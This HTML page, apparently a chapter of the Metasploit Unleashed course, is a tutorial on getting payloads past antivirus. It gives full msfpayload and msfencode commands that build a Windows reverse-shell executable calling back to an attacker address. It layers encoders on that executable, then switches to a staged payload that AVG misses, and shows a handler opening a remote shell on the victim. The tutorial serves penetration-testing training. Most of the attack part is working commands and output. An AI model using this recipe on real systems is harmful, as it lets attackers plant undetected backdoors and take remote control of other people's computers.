<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Antivirus Bypass</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Antivirus
Bypass</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">As we have seen, the Metasploit binary
payloads work great. However, there is a bit of a complication.
</p>
<p style="color: rgb(0, 0, 0);">Most Windows based systems currently
run some form of anti-virus
protection due to the widespread pervasiveness of malicious software
targeting the platform. Let's make our example a little bit more
real-world, and install the free version of AVG on the system and see
what happens.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:AVG_threat_detected_01.png"
 class="image"><img alt="AVG threat detected 01.png"
 src="http://www.offensive-security.com/w/images/b/b7/AVG_threat_detected_01.png"
 width="500" height="332"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Right away, our payload gets detected. Let's see if there is anything
we can do to prevent this from being discovered by AVG.
</p>
<p style="color: rgb(0, 0, 0);">We will encode our produced executable
in an attempt to make it
harder to discover. We have used encoding before when exploiting
software in avoiding bad characters so let's see if we can make use of
it here. We will use the command line msfencode program. Lets look at
some of the options by running msfencode with the '-h' switch.
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfencode -h<br><br>    Usage: ./msfencode<br><br>OPTIONS:<br><br>    -a   The architecture to encode as<br>    -b   The list of characters to avoid: 'x00xff'<br>    -c   The number of times to encode the data<br>    -e   The encoder to use<br>    -h        Help banner<br>    -i   Encode the contents of the supplied file path<br>    -l        List available encoders<br>    -m   Specifies an additional module search path<br>    -n        Dump encoder information<br>    -o   The output file<br>    -s   The maximum size of the encoded data<br>    -t   The format to display the encoded buffer with (raw, ruby, perl, c, exe, vba)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Let's see which encoders are
available to us by running 'msfencode -l'.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfencode -l<br><br>Framework Encoders<br>==================<br><br>    Name                    Rank       Description                                         <br>    ----                    ----       -----------                                         <br>    cmd/generic_sh          normal     Generic Shell Variable Substitution Command Encoder <br>    generic/none            normal     The "none" Encoder                                  <br>    mipsbe/longxor          normal     XOR Encoder                                         <br>    mipsle/longxor          normal     XOR Encoder                                         <br>    php/base64              normal     PHP Base64 encoder                                  <br>    ppc/longxor             normal     PPC LongXOR Encoder                                 <br>    ppc/longxor_tag         normal     PPC LongXOR Encoder                                 <br>    sparc/longxor_tag       normal     SPARC DWORD XOR Encoder                             <br>    x86/alpha_mixed         low        Alpha2 Alphanumeric Mixedcase Encoder               <br>    x86/alpha_upper         low        Alpha2 Alphanumeric Uppercase Encoder               <br>    x86/avoid_utf8_tolower  manual     Avoid UTF8/tolower                                  <br>    x86/call4_dword_xor     normal     Call+4 Dword XOR Encoder                            <br>    x86/countdown           normal     Single-byte XOR Countdown Encoder                   <br>    x86/fnstenv_mov         normal     Variable-length Fnstenv/mov Dword XOR Encoder       <br>    x86/jmp_call_additive   great      Polymorphic Jump/Call XOR Additive Feedback Encoder <br>    x86/nonalpha            low        Non-Alpha Encoder                                   <br>    x86/nonupper            low        Non-Upper Encoder                                   <br>    x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder           <br>    x86/unicode_mixed       manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder       <br>    x86/unicode_upper       manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Excellent. We can see our options
and some various encoders we can
make use of. Let's use the raw output of msfpayload, and pipe that as
input to msfencode using the "shikata ga nai encoder" (translates to
"it can't be helped" or "nothing can be done about it"). From there,
we'll output a windows binary.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfpayload windows/shell_reverse_tcp LHOST=172.16.104.130 LPORT=31337 R | ./msfencode -e x86/shikata_ga_nai -t exe &gt; /tmp/2.exe<br><br>[*] x86/shikata_ga_nai succeeded with size 315 (iteration=1)<br><br>root@bt:/pentest/exploits/framework3# file /tmp/2.exe<br><br>/tmp/2.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Perfect! Let's now transfer the
binary to another system and see what happens. And...
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:AVG_threat_detected_02.png"
 class="image"><img alt="AVG threat detected 02.png"
 src="http://www.offensive-security.com/w/images/d/dd/AVG_threat_detected_02.png"
 width="567" height="63"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Well, that's not good. It is still being discovered by AVG. Well,
we can't let AVG win, can we? Let's get a little crazy with it, and use
three different encoders, two of which we will tell it to run through
10 times each, for a total of 21 encodes. This is about as much
encoding as we can do and still have a working binary. AVG will never
get past this!
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfpayload windows/shell_reverse_tcp LHOST=172.16.104.130 LPORT=31337 R | ./msfencode -e x86/shikata_ga_nai -t raw -c 10 | ./msfencode -e x86/call4_dword_xor -t raw -c 10 | ./msfencode -e x86/countdown -t exe &gt; /tmp/6.exe                                                                         <br>[*] x86/shikata_ga_nai succeeded with size 315 (iteration=1)<br><br>[*] x86/shikata_ga_nai succeeded with size 342 (iteration=2)<br><br>[*] x86/shikata_ga_nai succeeded with size 369 (iteration=3)<br><br>[*] x86/shikata_ga_nai succeeded with size 396 (iteration=4)<br><br>[*] x86/shikata_ga_nai succeeded with size 423 (iteration=5)<br><br>[*] x86/shikata_ga_nai succeeded with size 450 (iteration=6)<br><br>[*] x86/shikata_ga_nai succeeded with size 477 (iteration=7)<br><br>[*] x86/shikata_ga_nai succeeded with size 504 (iteration=8)<br><br>[*] x86/shikata_ga_nai succeeded with size 531 (iteration=9)<br><br>[*] x86/shikata_ga_nai succeeded with size 558 (iteration=10)<br><br>[*] x86/call4_dword_xor succeeded with size 586 (iteration=1)<br><br>[*] x86/call4_dword_xor succeeded with size 614 (iteration=2)<br><br>[*] x86/call4_dword_xor succeeded with size 642 (iteration=3)<br><br>[*] x86/call4_dword_xor succeeded with size 670 (iteration=4)<br><br>[*] x86/call4_dword_xor succeeded with size 698 (iteration=5)<br><br>[*] x86/call4_dword_xor succeeded with size 726 (iteration=6)<br><br>[*] x86/call4_dword_xor succeeded with size 754 (iteration=7)<br><br>[*] x86/call4_dword_xor succeeded with size 782 (iteration=8)<br><br>[*] x86/call4_dword_xor succeeded with size 810 (iteration=9)<br><br>[*] x86/call4_dword_xor succeeded with size 838 (iteration=10)<br><br>[*] x86/countdown succeeded with size 856 (iteration=1)<br><br>root@bt4:/pentest/exploits/framework3# file /tmp/6.exe<br>/tmp/6.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Ok, we will copy over the binary,
run it aaaannnnd....
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:AVG_threat_detected_03.png"
 class="image"><img alt="AVG threat detected 03.png"
 src="http://www.offensive-security.com/w/images/b/ba/AVG_threat_detected_03.png"
 width="508" height="339"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We failed! It still is discovered by AVG! How will we ever get past
this?
Well, it turns out there is a good reason for this. Metasploit supports
two different types of payloads. The first sort, like
'window/shell_reverse_tcp', contains all the code needed for the
payload. The other, like 'windows/shell/reverse_tcp' works a bit
differently. 'windows/shell/reverse_tcp' contains just enough code to
open a network connection, then stage the loading of the rest of the
code required by the exploit from the attackers machine. So, in the
case of 'windows/shell/reverse_tcp', a connection is made back to the
attacker system, the rest of the payload is loaded into memory, and
then a shell is provided.
</p>
<p style="color: rgb(0, 0, 0);">So what does this mean for antivirus?
Well, most antivirus
works on signature-based technology. The code utilized by
'windows/shell_reverse_tcp' hits those signatures and is tagged by AVG
right away. On the other hand, the staged payload,
'windows/shell/reverse_tcp' does not contain the signature that AVG is
looking for, and so is therefore missed. Plus, by containing less code,
there is less for the anti-virus program to work with, as if the
signature is made too generic, the false positive rate will go up and
frustrate users by triggering on non-malicious software.
</p>
<p style="color: rgb(0, 0, 0);">With that in mind, let's generate a
'windows/shell/reverse_tcp' staged payload as an excutable.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfpayload windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 X &gt; /tmp/7.exe<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/shell/reverse_tcp<br> Length: 278<br>Options: LHOST=172.16.104.130,LPORT=31337<br><br>root@bt4:/pentest/exploits/framework3# file /tmp/7.exe<br>/tmp/7.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Ok, now we copy it over to the
remote system and run it, then see what happens.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 E<br>[*] Please wait while we load the module tree...<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Sending stage (474 bytes)<br>[*] Command shell session 1 opened (172.16.104.130:31337 -&gt; 172.16.104.128:1548)<br><br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Jim\My Documents&gt;dir<br>dir<br>Volume in drive C has no label.<br>Volume Serial Number is E423-E726<br><br>Directory of C:\Documents and Settings\Jim\My Documents<br><br>05/27/2009 09:56 PM<br>.<br>05/27/2009 09:56 PM<br>..<br>05/25/2009 09:36 PM 9,728 7.exe<br>05/25/2009 11:46 PM<br>Downloads<br>10/29/2008 05:55 PM<br>My Music<br>10/29/2008 05:55 PM<br>My Pictures<br>1 File(s) 9,728 bytes<br>5 Dir(s) 38,655,614,976 bytes free<br><br>C:\Documents and Settings\Jim\My Documents&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Success! Antivirus did not trigger
on this new staged payload. We
have successfully evaded antivirus on the system, and delivered our
payload. </span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Client_Side_Exploits"
 title="Client Side Exploits">Client-Side Exploits</a></div>
</body>
</html>
